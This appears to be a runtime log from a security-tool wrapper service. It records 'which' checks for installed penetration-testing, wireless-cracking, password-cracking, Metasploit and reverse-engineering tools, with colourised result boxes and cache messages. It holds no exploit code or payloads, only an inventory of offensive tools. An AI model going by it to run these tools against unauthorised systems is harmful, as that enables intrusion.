2025-10-24 06:15:12,718 - __main__ - INFO - 🆔 REGISTERED: Process 3508 - which sleuthkit...
2025-10-24 06:15:12,719 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3508
2025-10-24 06:15:12,723 - __main__ - INFO - 🧹 CLEANUP: Process 3508 removed from registry
2025-10-24 06:15:12,723 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:12,723 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,723 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:12,723 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,723 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which sleuthkit
2025-10-24 06:15:12,723 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,723 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:12,723 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:12,723 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:12,723 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,723 - __main__ - INFO - 🔍 Cache MISS for command: which autopsy
2025-10-24 06:15:12,723 - __main__ - INFO - 🚀 EXECUTING: which autopsy
2025-10-24 06:15:12,723 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,724 - __main__ - INFO - 🆔 PROCESS: PID 3513 started
2025-10-24 06:15:12,724 - __main__ - INFO - 🆔 REGISTERED: Process 3513 - which autopsy...
2025-10-24 06:15:12,725 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3513
2025-10-24 06:15:12,726 - __main__ - INFO - 📤 STDOUT: /usr/bin/autopsy
2025-10-24 06:15:12,729 - __main__ - INFO - 🧹 CLEANUP: Process 3513 removed from registry
2025-10-24 06:15:12,729 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,729 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,729 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,729 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,729 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which autopsy
2025-10-24 06:15:12,729 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,729 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 06:15:12,729 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,729 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,729 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,729 - __main__ - INFO - 💾 Cached result for command: which autopsy
2025-10-24 06:15:12,729 - __main__ - INFO - 🔍 Cache MISS for command: which evil-winrm
2025-10-24 06:15:12,729 - __main__ - INFO - 🚀 EXECUTING: which evil-winrm
2025-10-24 06:15:12,729 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,730 - __main__ - INFO - 🆔 PROCESS: PID 3518 started
2025-10-24 06:15:12,730 - __main__ - INFO - 🆔 REGISTERED: Process 3518 - which evil-winrm...
2025-10-24 06:15:12,731 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3518
2025-10-24 06:15:12,732 - __main__ - INFO - 📤 STDOUT: /usr/bin/evil-winrm
2025-10-24 06:15:12,735 - __main__ - INFO - 🧹 CLEANUP: Process 3518 removed from registry
2025-10-24 06:15:12,735 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,735 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,735 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,735 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,735 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which evil-winrm
2025-10-24 06:15:12,735 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,735 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 20 bytes
2025-10-24 06:15:12,735 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,735 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,735 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,735 - __main__ - INFO - 💾 Cached result for command: which evil-winrm
2025-10-24 06:15:12,735 - __main__ - INFO - 💾 Cache HIT for command: which paramspider
2025-10-24 06:15:12,735 - __main__ - INFO - 🔍 Cache MISS for command: which airmon-ng
2025-10-24 06:15:12,735 - __main__ - INFO - 🚀 EXECUTING: which airmon-ng
2025-10-24 06:15:12,735 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,736 - __main__ - INFO - 🆔 PROCESS: PID 3523 started
2025-10-24 06:15:12,736 - __main__ - INFO - 🆔 REGISTERED: Process 3523 - which airmon-ng...
2025-10-24 06:15:12,736 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3523
2025-10-24 06:15:12,738 - __main__ - INFO - 📤 STDOUT: /usr/sbin/airmon-ng
2025-10-24 06:15:12,740 - __main__ - INFO - 🧹 CLEANUP: Process 3523 removed from registry
2025-10-24 06:15:12,741 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,741 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,741 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,741 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,741 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which airmon-ng
2025-10-24 06:15:12,741 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,741 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 20 bytes
2025-10-24 06:15:12,741 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,741 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,741 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,741 - __main__ - INFO - 💾 Cached result for command: which airmon-ng
2025-10-24 06:15:12,741 - __main__ - INFO - 🔍 Cache MISS for command: which airodump-ng
2025-10-24 06:15:12,741 - __main__ - INFO - 🚀 EXECUTING: which airodump-ng
2025-10-24 06:15:12,741 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,742 - __main__ - INFO - 🆔 PROCESS: PID 3528 started
2025-10-24 06:15:12,742 - __main__ - INFO - 🆔 REGISTERED: Process 3528 - which airodump-ng...
2025-10-24 06:15:12,742 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3528
2025-10-24 06:15:12,744 - __main__ - INFO - 📤 STDOUT: /usr/sbin/airodump-ng
2025-10-24 06:15:12,746 - __main__ - INFO - 🧹 CLEANUP: Process 3528 removed from registry
2025-10-24 06:15:12,746 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,747 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,747 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,747 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,747 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which airodump-ng
2025-10-24 06:15:12,747 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,747 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 22 bytes
2025-10-24 06:15:12,747 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,747 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,747 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,747 - __main__ - INFO - 💾 Cached result for command: which airodump-ng
2025-10-24 06:15:12,747 - __main__ - INFO - 🔍 Cache MISS for command: which aireplay-ng
2025-10-24 06:15:12,747 - __main__ - INFO - 🚀 EXECUTING: which aireplay-ng
2025-10-24 06:15:12,747 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,747 - __main__ - INFO - 🆔 PROCESS: PID 3533 started
2025-10-24 06:15:12,747 - __main__ - INFO - 🆔 REGISTERED: Process 3533 - which aireplay-ng...
2025-10-24 06:15:12,748 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3533
2025-10-24 06:15:12,749 - __main__ - INFO - 📤 STDOUT: /usr/sbin/aireplay-ng
2025-10-24 06:15:12,751 - __main__ - INFO - 🧹 CLEANUP: Process 3533 removed from registry
2025-10-24 06:15:12,751 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,751 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,752 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,752 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,752 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which aireplay-ng
2025-10-24 06:15:12,752 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,752 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 22 bytes
2025-10-24 06:15:12,752 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,752 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,752 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,752 - __main__ - INFO - 💾 Cached result for command: which aireplay-ng
2025-10-24 06:15:12,752 - __main__ - INFO - 🔍 Cache MISS for command: which aircrack-ng
2025-10-24 06:15:12,752 - __main__ - INFO - 🚀 EXECUTING: which aircrack-ng
2025-10-24 06:15:12,752 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,752 - __main__ - INFO - 🆔 PROCESS: PID 3538 started
2025-10-24 06:15:12,752 - __main__ - INFO - 🆔 REGISTERED: Process 3538 - which aircrack-ng...
2025-10-24 06:15:12,753 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3538
2025-10-24 06:15:12,755 - __main__ - INFO - 📤 STDOUT: /usr/bin/aircrack-ng
2025-10-24 06:15:12,757 - __main__ - INFO - 🧹 CLEANUP: Process 3538 removed from registry
2025-10-24 06:15:12,757 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,757 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,757 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,757 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,757 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which aircrack-ng
2025-10-24 06:15:12,757 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,757 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 21 bytes
2025-10-24 06:15:12,757 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,757 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,757 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,757 - __main__ - INFO - 💾 Cached result for command: which aircrack-ng
2025-10-24 06:15:12,757 - __main__ - INFO - 🔍 Cache MISS for command: which msfvenom
2025-10-24 06:15:12,757 - __main__ - INFO - 🚀 EXECUTING: which msfvenom
2025-10-24 06:15:12,757 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,758 - __main__ - INFO - 🆔 PROCESS: PID 3543 started
2025-10-24 06:15:12,758 - __main__ - INFO - 🆔 REGISTERED: Process 3543 - which msfvenom...
2025-10-24 06:15:12,758 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3543
2025-10-24 06:15:12,760 - __main__ - INFO - 📤 STDOUT: /usr/bin/msfvenom
2025-10-24 06:15:12,762 - __main__ - INFO - 🧹 CLEANUP: Process 3543 removed from registry
2025-10-24 06:15:12,762 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,762 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,762 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,762 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,762 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which msfvenom
2025-10-24 06:15:12,762 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,762 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 06:15:12,763 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,763 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,763 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,763 - __main__ - INFO - 💾 Cached result for command: which msfvenom
2025-10-24 06:15:12,763 - __main__ - INFO - 💾 Cache HIT for command: which msfconsole
2025-10-24 06:15:12,763 - __main__ - INFO - 🔍 Cache MISS for command: which graphql-scanner
2025-10-24 06:15:12,763 - __main__ - INFO - 🚀 EXECUTING: which graphql-scanner
2025-10-24 06:15:12,763 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,763 - __main__ - INFO - 🆔 PROCESS: PID 3548 started
2025-10-24 06:15:12,763 - __main__ - INFO - 🆔 REGISTERED: Process 3548 - which graphql-scanner...
2025-10-24 06:15:12,764 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3548
2025-10-24 06:15:12,769 - __main__ - INFO - 🧹 CLEANUP: Process 3548 removed from registry
2025-10-24 06:15:12,769 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:12,769 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,769 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:12,769 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,769 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which graphql-scanner
2025-10-24 06:15:12,769 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,769 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:12,769 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:12,769 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:12,769 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,770 - __main__ - INFO - 🔍 Cache MISS for command: which jwt-analyzer
2025-10-24 06:15:12,770 - __main__ - INFO - 🚀 EXECUTING: which jwt-analyzer
2025-10-24 06:15:12,770 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,770 - __main__ - INFO - 🆔 PROCESS: PID 3553 started
2025-10-24 06:15:12,770 - __main__ - INFO - 🆔 REGISTERED: Process 3553 - which jwt-analyzer...
2025-10-24 06:15:12,771 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3553
2025-10-24 06:15:12,776 - __main__ - INFO - 🧹 CLEANUP: Process 3553 removed from registry
2025-10-24 06:15:12,776 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:12,776 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,776 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:12,776 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,776 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which jwt-analyzer
2025-10-24 06:15:12,776 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,776 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:12,776 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:12,776 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:12,776 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:13,796 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 06:15:13] "GET /health HTTP/1.1" 200 -
2025-10-24 06:15:27,302 - __main__ - INFO - 💾 Cache HIT for command: which nmap
2025-10-24 06:15:27,302 - __main__ - INFO - 💾 Cache HIT for command: which gobuster
2025-10-24 06:15:27,302 - __main__ - INFO - 💾 Cache HIT for command: which dirb
2025-10-24 06:15:27,302 - __main__ - INFO - 💾 Cache HIT for command: which nikto
2025-10-24 06:15:27,302 - __main__ - INFO - 💾 Cache HIT for command: which sqlmap
2025-10-24 06:15:27,302 - __main__ - INFO - 💾 Cache HIT for command: which hydra
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which john
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which hashcat
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which rustscan
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which masscan
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which autorecon
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which nbtscan
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which arp-scan
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which responder
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which nxc
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which enum4linux-ng
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which rpcclient
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which enum4linux
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which ffuf
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which feroxbuster
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which dirsearch
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which dotdotpwn
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which xsser
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which wfuzz
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which gau
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which waybackurls
2025-10-24 06:15:27,303 - __main__ - INFO - 💾 Cache HIT for command: which arjun
2025-10-24 06:15:27,304 - __main__ - INFO - 💾 Cache HIT for command: which paramspider
2025-10-24 06:15:27,304 - __main__ - INFO - 💾 Cache HIT for command: which x8
2025-10-24 06:15:27,304 - __main__ - INFO - 💾 Cache HIT for command: which jaeles
2025-10-24 06:15:27,304 - __main__ - INFO - 💾 Cache HIT for command: which dalfox
2025-10-24 06:15:27,304 - __main__ - INFO - 💾 Cache HIT for command: which httpx
2025-10-24 06:15:27,304 - __main__ - INFO - 💾 Cache HIT for command: which wafw00f
2025-10-24 06:15:27,304 - __main__ - INFO - 💾 Cache HIT for command: which burpsuite
2025-10-24 06:15:27,304 - __main__ - INFO - 💾 Cache HIT for command: which zaproxy
2025-10-24 06:15:27,304 - __main__ - INFO - 💾 Cache HIT for command: which katana
2025-10-24 06:15:27,304 - __main__ - INFO - 💾 Cache HIT for command: which hakrawler
2025-10-24 06:15:27,304 - __main__ - INFO - 💾 Cache HIT for command: which nuclei
2025-10-24 06:15:27,304 - __main__ - INFO - 💾 Cache HIT for command: which wpscan
2025-10-24 06:15:27,304 - __main__ - INFO - 🔍 Cache MISS for command: which graphql-scanner
2025-10-24 06:15:27,304 - __main__ - INFO - 🚀 EXECUTING: which graphql-scanner
2025-10-24 06:15:27,304 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:27,305 - __main__ - INFO - 🆔 PROCESS: PID 3653 started
2025-10-24 06:15:27,305 - __main__ - INFO - 🆔 REGISTERED: Process 3653 - which graphql-scanner...
2025-10-24 06:15:27,305 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3653
2025-10-24 06:15:27,310 - __main__ - INFO - 🧹 CLEANUP: Process 3653 removed from registry
2025-10-24 06:15:27,310 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:27,310 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:27,310 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:27,311 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:27,311 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which graphql-scanner
2025-10-24 06:15:27,311 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:27,311 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:27,311 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:27,311 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:27,311 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:27,311 - __main__ - INFO - 🔍 Cache MISS for command: which jwt-analyzer
2025-10-24 06:15:27,311 - __main__ - INFO - 🚀 EXECUTING: which jwt-analyzer
2025-10-24 06:15:27,311 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:27,311 - __main__ - INFO - 🆔 PROCESS: PID 3658 started
2025-10-24 06:15:27,311 - __main__ - INFO - 🆔 REGISTERED: Process 3658 - which jwt-analyzer...
2025-10-24 06:15:27,312 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3658
2025-10-24 06:15:27,315 - __main__ - INFO - 🧹 CLEANUP: Process 3658 removed from registry
2025-10-24 06:15:27,315 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 06:15:27,315 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:27,316 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:27,316 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:27,316 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which jwt-analyzer
2025-10-24 06:15:27,316 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:27,316 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:27,316 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:27,316 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:27,316 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:27,316 - __main__ - INFO - 💾 Cache HIT for command: which medusa
2025-10-24 06:15:27,316 - __main__ - INFO - 💾 Cache HIT for command: which patator
2025-10-24 06:15:27,316 - __main__ - INFO - 💾 Cache HIT for command: which hash-identifier
2025-10-24 06:15:27,316 - __main__ - INFO - 💾 Cache HIT for command: which ophcrack
2025-10-24 06:15:27,316 - __main__ - INFO - 💾 Cache HIT for command: which gdb
2025-10-24 06:15:27,316 - __main__ - INFO - 💾 Cache HIT for command: which radare2
2025-10-24 06:15:27,316 - __main__ - INFO - 💾 Cache HIT for command: which binwalk
2025-10-24 06:15:27,316 - __main__ - INFO - 💾 Cache HIT for command: which ropgadget
2025-10-24 06:15:27,316 - __main__ - INFO - 💾 Cache HIT for command: which checksec
2025-10-24 06:15:27,316 - __main__ - INFO - 💾 Cache HIT for command: which objdump
2025-10-24 06:15:27,316 - __main__ - INFO - 💾 Cache HIT for command: which ghidra
2025-10-24 06:15:27,316 - __main__ - INFO - 💾 Cache HIT for command: which ropper
